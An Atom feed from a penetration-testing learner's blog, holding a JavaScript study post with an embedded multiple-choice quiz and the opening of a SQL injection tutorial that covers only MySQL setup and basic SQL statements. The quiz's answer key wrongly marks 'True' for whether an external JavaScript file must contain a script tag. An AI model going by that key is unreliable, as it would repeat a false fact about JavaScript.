<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-05-27T10:38:26+03:00</updated><id>http://localhost:4000/</id><title type="html">Zwerd</title><subtitle>A stunning blog of freaking PT warrior</subtitle><author><name>Guy Zwerdling</name></author><entry><title type="html">JavaScript - the future of programming.</title><link href="http://localhost:4000/2018/04/23/javascript-tutorial.html" rel="alternate" type="text/html" title="JavaScript - the future of programming." /><published>2018-04-23T00:00:00+03:00</published><updated>2018-04-23T00:00:00+03:00</updated><id>http://localhost:4000/2018/04/23/javascript-tutorial</id><content type="html" xml:base="http://localhost:4000/2018/04/23/javascript-tutorial.html">&lt;p&gt;It’s been awhile, after I done with my SQLi project I start to learn XSS, I found it fascinating! but I felt like I need more strong base knowledge about JavaScript to do my magic stuff. after a week or two I decided to make my on tutorials video about JS and this time in Hebrew, from that project I was learn a lot!&lt;/p&gt;

&lt;p&gt;Originally I wrote that tutorial for Michael which is a friend but unfortunately he give up on JS studies for some unknown reason.&lt;/p&gt;

&lt;p&gt;So here I am finding myself work on some tutorial that is basically designed for me lol!&lt;/p&gt;

&lt;p&gt;I have 3 goals in the next few weeks, first of all I want to do the JS exam that w3schools offers, with this exam I can examine my knowledge in JavaScript and I will feel comfortable with that.&lt;/p&gt;

&lt;p&gt;The second goal is to pass succesfully the GWAPT exam which examine your knowledge in web application penetration testing, for XSS attack and XSRF, the best you can do for your self is to concentrate on JavaScript knowledge because it’s (web attacks - especially XSS &amp;amp; XSRF) have a great deal with JavaScript.&lt;/p&gt;

&lt;p&gt;The third goal is to pass the OSCP exam which examine your knowledge in the world of penetration testing.&lt;/p&gt;

&lt;p&gt;On my JavaScript tutorial I am teach every filed and chapter through w3schools, and in more few days I will be ready to take the exam.&lt;/p&gt;

&lt;p&gt;The tutorial contain also some challenges that I found on the web and we solved it together, after that we will start to develop our won game! and do some more cool stuff.&lt;/p&gt;

&lt;p&gt;I love JS, It is fun and challenge my mind how to do big stuff in short mount of time.&lt;/p&gt;

&lt;p&gt;To help myself to preper the exam, I build some test with many question about JavaScript and hope it’s will help every one who watch this tutorial and want to take the exam too.&lt;/p&gt;

&lt;h3 id=&quot;javascript---the-first-video-about-the-tutorial&quot;&gt;JavaScript - the first video about the tutorial:&lt;/h3&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/2bJtEFba6zI&quot; frameborder=&quot;0&quot; allow=&quot;autoplay; encrypted-media&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;So like I said that tutorial is build in such a way to help me to pass the exam, but to be sure enough that I will succeed to pass the exam I made some self test to check my (or your) knowledge.&lt;/p&gt;

&lt;p&gt;On this quiz you will find question that I found on the web and more question that I made, if you have some issue with some question please feel free to contact me.&lt;/p&gt;

&lt;h3 id=&quot;javascript---quiz&quot;&gt;JavaScript - quiz:&lt;/h3&gt;
&lt;!--do not cheat!!! and don't look at the source code!!!!--&gt;

&lt;form id=&quot;quiz&quot; name=&quot;quiz&quot;&gt;
&lt;link rel=&quot;stylesheet&quot; href=&quot;/scripts/quiz.css&quot; /&gt;
  &lt;p class=&quot;questions&quot;&gt;1. Inside which HTML element do we put the JavaScript?&lt;/p&gt;
  &lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q1&quot; value=&quot;1&quot; /&gt;&amp;lt;script&amp;gt;&lt;br /&gt;
  &lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q1&quot; value=&quot;0&quot; /&gt;&amp;lt;js&amp;gt;&lt;br /&gt;
  &lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q1&quot; value=&quot;0&quot; /&gt;&amp;lt;javascript&amp;gt;&lt;br /&gt;
  &lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q1&quot; value=&quot;0&quot; /&gt;&amp;lt;code&amp;gt;&lt;br /&gt;
  &lt;br /&gt;

  &lt;p class=&quot;questions&quot;&gt;2. What is the correct JavaScript syntax to change the content of the HTML element below?
  &lt;br /&gt;
  &amp;lt;p id=&quot;demo&quot;&amp;gt;This is a demonstration.&amp;lt;/p&amp;gt;
  &lt;/p&gt;
  &lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q2&quot; value=&quot;0&quot; /&gt; document.getElement(&quot;p&quot;).innerHTML = &quot;Hello World!&quot;;&lt;br /&gt;
  &lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q2&quot; value=&quot;0&quot; /&gt;#demo.innerHTML = &quot;Hello World!&quot;;&lt;br /&gt;
  &lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q2&quot; value=&quot;0&quot; /&gt;document.getElementByName(&quot;p&quot;).innerHTML = &quot;Hello World!&quot;;&lt;br /&gt;
  &lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q2&quot; value=&quot;1&quot; /&gt;document.getElementById(&quot;demo&quot;).innerHTML = &quot;Hello World!&quot;;&lt;br /&gt;&lt;br /&gt;


&lt;p class=&quot;questions&quot;&gt;3. What is boolean?&lt;/p&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q3&quot; value=&quot;0&quot; /&gt;It is some positive value&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q3&quot; value=&quot;1&quot; /&gt;It is some value base on True or False&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q3&quot; value=&quot;0&quot; /&gt;t's a binary value that can be 0 or 1&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q3&quot; value=&quot;0&quot; /&gt;none of the answers are correct&lt;br /&gt;
&lt;br /&gt;




&lt;p class=&quot;questions&quot;&gt;4. Where is the correct place to insert a JavaScript?&lt;/p&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q4&quot; value=&quot;0&quot; /&gt;The &amp;lt;head&amp;gt; section&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q4&quot; value=&quot;0&quot; /&gt;The &amp;lt;body&amp;gt; section&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q4&quot; value=&quot;1&quot; /&gt;Both the &amp;lt;head&amp;gt; section and the &amp;lt;body&amp;gt; section are correct&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q4&quot; value=&quot;0&quot; /&gt;None&lt;br /&gt;




&lt;br /&gt;&lt;p class=&quot;questions&quot;&gt;5. What is the correct syntax for referring to an external script called &quot;xxx.js&quot;?&lt;/p&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q5&quot; value=&quot;0&quot; /&gt;&amp;lt;script name=&quot;xxx.js&quot;&amp;gt;&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q5&quot; value=&quot;1&quot; /&gt;&amp;lt;script src=&quot;xxx.js&quot;&amp;gt;&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q5&quot; value=&quot;0&quot; /&gt;&amp;lt;script href=&quot;xxx.js&quot;&amp;gt;&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q5&quot; value=&quot;0&quot; /&gt;&amp;lt;script link=&quot;xxx.js&quot;&amp;gt;&lt;br /&gt;




&lt;br /&gt;&lt;p class=&quot;questions&quot;&gt;6. The external JavaScript file must contain the &amp;lt;script&amp;gt; tag.&lt;/p&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q6&quot; value=&quot;1&quot; /&gt;True&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q6&quot; value=&quot;0&quot; /&gt;False&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q6&quot; value=&quot;0&quot; /&gt;The tage can be what you whant&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q6&quot; value=&quot;0&quot; /&gt;The tag must be with src element&lt;br /&gt;




&lt;br /&gt;&lt;p class=&quot;questions&quot;&gt;7. How do you write &quot;Hello World&quot; in an alert box?&lt;/p&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q7&quot; value=&quot;0&quot; /&gt;msgBox(&quot;Hello World&quot;);&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q7&quot; value=&quot;1&quot; /&gt;alert(&quot;Hello World&quot;);&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q7&quot; value=&quot;0&quot; /&gt;msg(&quot;Hello World&quot;);&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q7&quot; value=&quot;0&quot; /&gt;alertBox(&quot;Hello World&quot;);&lt;br /&gt;




&lt;br /&gt;&lt;p class=&quot;questions&quot;&gt;8. How do you call a function named &quot;myFunction&quot;?&lt;/p&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q8&quot; value=&quot;1&quot; /&gt;myFunction()&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q8&quot; value=&quot;0&quot; /&gt;myFunction&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q8&quot; value=&quot;0&quot; /&gt;call function myFunction()&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q8&quot; value=&quot;0&quot; /&gt;call myFunction()&lt;br /&gt;
&lt;br /&gt;&lt;p class=&quot;questions&quot;&gt;10.How to write an IF statement in JavaScript?&lt;/p&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q9&quot; value=&quot;0&quot; /&gt;if i = 5 then&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q9&quot; value=&quot;0&quot; /&gt;if i == 5 then&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q9&quot; value=&quot;1&quot; /&gt;if (i == 5)&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q9&quot; value=&quot;0&quot; /&gt;if i = 5&lt;br /&gt;




&lt;br /&gt;&lt;p class=&quot;questions&quot;&gt;10. How to write an IF statement for executing some code if &quot;i&quot; is NOT equal to 5?&lt;/p&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q10&quot; value=&quot;0&quot; /&gt;if i =! 5 then&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q10&quot; value=&quot;0&quot; /&gt;if i &amp;lt;&amp;gt; 5&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q10&quot; value=&quot;1&quot; /&gt;if (i!=5)&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q10&quot; value=&quot;0&quot; /&gt;if(i&amp;lt;&amp;gt;5)&lt;br /&gt;
&lt;br /&gt;&lt;p class=&quot;questions&quot;&gt;11. How does a WHILE loop start?&lt;/p&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q11&quot; value=&quot;1&quot; /&gt;while (i &amp;lt;= 10)&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q11&quot; value=&quot;0&quot; /&gt;while (i &amp;lt;= 10) than&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q11&quot; value=&quot;0&quot; /&gt;while i = 1 to 10&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q11&quot; value=&quot;0&quot; /&gt;while (i &amp;lt;= 10; i++)&lt;br /&gt;




&lt;br /&gt;&lt;p class=&quot;questions&quot;&gt;12. How does a FOR loop start?&lt;/p&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q12&quot; value=&quot;1&quot; /&gt;for (i = 0; i &amp;lt;= 5; i++)&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q12&quot; value=&quot;0&quot; /&gt;for (i = 0; i &amp;lt;= 5)&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q12&quot; value=&quot;0&quot; /&gt;for (i &amp;lt;= 5; i++)&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q12&quot; value=&quot;0&quot; /&gt;for i = 1 to 5&lt;br /&gt;
&lt;br /&gt;&lt;p class=&quot;questions&quot;&gt;13. How can you add a comment in a JavaScript?&lt;/p&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q13&quot; value=&quot;0&quot; /&gt;&amp;lt;!--This is a comment--&amp;gt;&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q13&quot; value=&quot;1&quot; /&gt;//This is a comment&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q13&quot; value=&quot;0&quot; /&gt;'This is a comment&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q13&quot; value=&quot;0&quot; /&gt;#This is a comment&lt;br /&gt;




&lt;br /&gt;&lt;p class=&quot;questions&quot;&gt;14. How to insert a comment that has more than one line?&lt;/p&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q14&quot; value=&quot;0&quot; /&gt;&amp;lt;!--this comment has &amp;lt;br&amp;gt; more then one line--&amp;gt;&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q14&quot; value=&quot;0&quot; /&gt;//This comment has &amp;lt;br&amp;gt; more then one line//&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q14&quot; value=&quot;0&quot; /&gt;//This comment has &amp;lt;br&amp;gt; more than one line*/&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q14&quot; value=&quot;1&quot; /&gt;/*This comment has &amp;lt;br&amp;gt; more than one line*/&lt;br /&gt;




&lt;br /&gt;&lt;p class=&quot;questions&quot;&gt;15. What is the correct way to write a JavaScript array?&lt;/p&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q15&quot; value=&quot;0&quot; /&gt;var colors = &quot;red&quot;, &quot;green&quot;, &quot;blue&quot;&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q15&quot; value=&quot;0&quot; /&gt;var colors = (1:&quot;red&quot;, 2:&quot;green&quot;, 3:&quot;blue&quot;)&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q15&quot; value=&quot;0&quot; /&gt;var colors = 1 = (&quot;red&quot;), 2 = (&quot;green&quot;), 3 = (&quot;blue&quot;)&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q15&quot; value=&quot;1&quot; /&gt;var colors = [&quot;red&quot;, &quot;green&quot;, &quot;blue&quot;]&lt;br /&gt;
&lt;br /&gt;&lt;p class=&quot;questions&quot;&gt;16. How do you round the number 7.25, to the nearest integer?&lt;/p&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q16&quot; value=&quot;1&quot; /&gt;Math.round(7.25)&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q16&quot; value=&quot;0&quot; /&gt;round(7.25)&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q16&quot; value=&quot;0&quot; /&gt;Math.rnd(7.25)&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q16&quot; value=&quot;0&quot; /&gt;rnd(7.25)&lt;br /&gt;




&lt;br /&gt;&lt;p class=&quot;questions&quot;&gt;17. How do you find the number with the highest value of x and y?&lt;/p&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q17&quot; value=&quot;0&quot; /&gt;ceil(x, y)&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q17&quot; value=&quot;0&quot; /&gt;top(x, y)&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q17&quot; value=&quot;1&quot; /&gt;Math.max(x, y)&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q17&quot; value=&quot;0&quot; /&gt;Math.ceil(x, y)&lt;br /&gt;
&lt;br /&gt;&lt;p class=&quot;questions&quot;&gt;18. What is the correct JavaScript syntax for opening a new window called &quot;w2&quot; ?&lt;/p&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q18&quot; value=&quot;1&quot; /&gt;w2 = window.open(&quot;http://www.w3schools.com&quot;);&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q18&quot; value=&quot;0&quot; /&gt;w2 = window.new(&quot;http://www.w3schools.com&quot;);&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q18&quot; value=&quot;0&quot; /&gt;w2 = window.winNew(&quot;https://zwerd.com&quot;);&lt;br /&gt;
&lt;input type=&quot;radio&quot; id=&quot;mc&quot; name=&quot;q18&quot; value=&quot;0&quot; /&gt;w2 = window.new.window(&quot;www.zwerd.com&quot;);&lt;br /&gt;




&lt;script&gt;function check(){var answer = document.getElementById(&quot;answer&quot;);
var correct = 0
var q1= document.quiz.q1.value;
if(q1== '1'){correct++};
var q2= document.quiz.q2.value;
if(q2== '1'){correct++};
var q3= document.quiz.q3.value;
if(q3== '1'){correct++};
var q4= document.quiz.q4.value;
if(q4== '1'){correct++};
var q5= document.quiz.q5.value;
if(q5== '1'){correct++};
var q6= document.quiz.q6.value;
if(q6== '1'){correct++};
var q7= document.quiz.q7.value;
if(q7== '1'){correct++};
var q8= document.quiz.q8.value;
if(q8== '1'){correct++};
var q9= document.quiz.q9.value;
if(q9== '1'){correct++};
var q10= document.quiz.q10.value;
if(q10== '1'){correct++};
var q11= document.quiz.q11.value;
if(q11== '1'){correct++};
var q12= document.quiz.q12.value;
if(q12== '1'){correct++};
var q13= document.quiz.q13.value;
if(q13== '1'){correct++};
var q14= document.quiz.q14.value;
if(q14== '1'){correct++};
var q15= document.quiz.q15.value;
if(q15== '1'){correct++};
var q16= document.quiz.q16.value;
if(q16== '1'){correct++};
var q17= document.quiz.q17.value;
if(q17== '1'){correct++};
var q18= document.quiz.q18.value;
if(q18== '1'){correct++};
answer.innerHTML='Your scor is: '+correct*100/18;
}
&lt;/script&gt;



&lt;br /&gt;
&lt;input id=&quot;button&quot; type=&quot;button&quot; value=&quot;End The Exam!&quot; style=&quot;font-size:20px&quot; onclick=&quot;check();&quot; /&gt;
&lt;p id=&quot;answer&quot;&gt;&lt;/p&gt;
&lt;/form&gt;</content><author><name>Guy Zwerdling</name></author><category term="JavaScript" /><summary type="html">It's been awhile, after I done with my SQLi project I start to learn XSS, I found it fascinating! but I felt like I need more strong base knowledge about JavaScript to do my magic stuff. after a week or two I decided to make my on tutorials video about JS and this time in Hebrew, from that project I was learn a lot!</summary></entry><entry><title type="html">SQL Injection</title><link href="http://localhost:4000/2018/02/15/SQL-Injection.html" rel="alternate" type="text/html" title="SQL Injection" /><published>2018-02-15T00:00:00+02:00</published><updated>2018-02-15T00:00:00+02:00</updated><id>http://localhost:4000/2018/02/15/SQL-Injection</id><content type="html" xml:base="http://localhost:4000/2018/02/15/SQL-Injection.html">&lt;p&gt;SQL or Structured Query Language is a way to store and pullout data from database and it’s fairly easy because it’s like English actually, you can write things like &lt;code class=&quot;highlighter-rouge&quot;&gt;SELECT * FROM thistable&lt;/code&gt; and every such command will bring up to you results from the database and this was the way to store things in websites and still does for many years.&lt;/p&gt;

&lt;p&gt;If we talking about injection you may know that inject some code is not related only to SQL, you can actually to do so with various programing language of course it depend on how the programmer developed that site, but if he or she not care enough about the little things in that code, we may find some way to inject some unwanted code to the website.&lt;/p&gt;

&lt;p&gt;In that  article I would like to present and demonstrate the following in order for you have a full picture of what is going on here, so the main goal here is:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#how-sql-work&quot;&gt;How SQL work.&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#what-is-the-vulnerability&quot;&gt;What is the vulnerability.&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#exploit-that-vulnerability&quot;&gt;Exploit that vulnerability.&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#how-to-migrate-that-vulnerability&quot;&gt;How to migrate that vulnerability.&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;how-sql-work&quot;&gt;How SQL work&lt;/h3&gt;

&lt;p&gt;I think that before you five in to SQL you need basic understanding how it works, in this section I’m using Ubuntu server with mysql database, so first of all let’s connect to our SQL database.&lt;/p&gt;

&lt;p&gt;To setup mysql in you Ubuntu server you can follow &lt;a href=&quot;https://help.ubuntu.com/lts/serverguide/mysql.html&quot;&gt;this documentation&lt;/a&gt; or you can just type:&lt;br /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; sudo apt update
 sudo apt upgrade
 sudo apt install mysql-server
 sudo service mysql start
 sudo service mysql status
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The last command will show you what is the status of your sql service, if you have some issue related to that service please search the error you got in &lt;a href=&quot;stackoverflow.com&quot;&gt;stackoverflow&lt;/a&gt; it is a grate way to solve issues with the community.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-001.png&quot; alt=&quot;sql-injection-001.png&quot; /&gt;
 &lt;strong&gt;Figure 1&lt;/strong&gt; MySQL server.&lt;/p&gt;

&lt;p&gt;After your sql server are ready to use just connect to the database, if it is you first time you should get aome alert about setup your password, just do the command &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo mysql -u root -p&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-002.png&quot; alt=&quot;sql-injection-002.png&quot; /&gt;
 &lt;strong&gt;Figure 2&lt;/strong&gt; Connect to the database.&lt;/p&gt;

&lt;p&gt;Now let’s look on the command we have in SQL.&lt;br /&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;CREATE DATABASE database_name;&lt;/code&gt; - create some database, in that database we will create tables that contain values of our users.&lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;CREATE TABLE table_name;&lt;/code&gt; - creating a table with columns and datatype.&lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;DROP  DATABASE database_name;&lt;/code&gt; - delete the database.&lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;DELETE FROM table_name WHERE column_name=value;&lt;/code&gt; - delete some value in our table base on the column_name name, please notice the &lt;code class=&quot;highlighter-rouge&quot;&gt;WHERE&lt;/code&gt; statement, if you doesn’t specified that WHERE it will delete every value in the table.&lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ALERT TABLE table_name DROP COLUMN column_name;&lt;/code&gt; - this command will delete the column in the table that we specified.&lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SELECT * FROM table_name;&lt;/code&gt; - this command will display every value from the table.&lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SELECT * FROM table_name ORDER BY column_name [ASC/DESC];&lt;/code&gt; - this will display the data ordered by the method we chose, DESC stand for descending and ASC stand for ascending.&lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ALTER TABLE table_name ADD column_name datatype;&lt;/code&gt; - to add some column to out table.&lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;UPDATE table_name SET column_name = value WHERE column_name = value;&lt;/code&gt; - set some value to some filed base on column_name value.&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&quot;sql-operators&quot;&gt;SQL Operators:&lt;/h5&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Operator&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;=&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Equal to&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;&amp;gt;&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;not equal to ( is the same as !=)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;gt;&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Greater than&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Less than&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;#&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Used for comment on that line (mean that alll character after ‘#’ will be ignored)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;%&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;If we use &lt;code class=&quot;highlighter-rouge&quot;&gt;LIKE&lt;/code&gt; it is used as wildcard character&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;LIMIT&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Limit the query by number&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;BETWEEN&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Will give us a rang&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;LIKE&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Matches a pattern&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IS or IS NOT&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Compare to null&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;strong&gt;Table 1&lt;/strong&gt; for more operator refer to &lt;a href=&quot;https://www.w3schools.com/sql/sql_operators.asp&quot;&gt;that link.&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Let’s create new database with table and filled that table with users ID and data.&lt;br /&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-mysql&quot; data-lang=&quot;mysql&quot;&gt;CREATE DATABASE mysite;
USE mysite;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Please remember that you mush chose database before you create some table.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-003.png&quot; alt=&quot;sql-injection-003.png&quot; /&gt;
&lt;strong&gt;Figure 3&lt;/strong&gt; Select database.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-mysql&quot; data-lang=&quot;mysql&quot;&gt;CREATE TABLE users(
  id INT NOT NULL,
  nickName VARCHAR(255),
  firstName VARCHAR(255),
  lestName VARCHAR(255),
  email VARCHAR(255)
  );&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-004.png&quot; alt=&quot;sql-injection-004.png&quot; /&gt;
&lt;strong&gt;Figure 4&lt;/strong&gt; Create table.&lt;/p&gt;

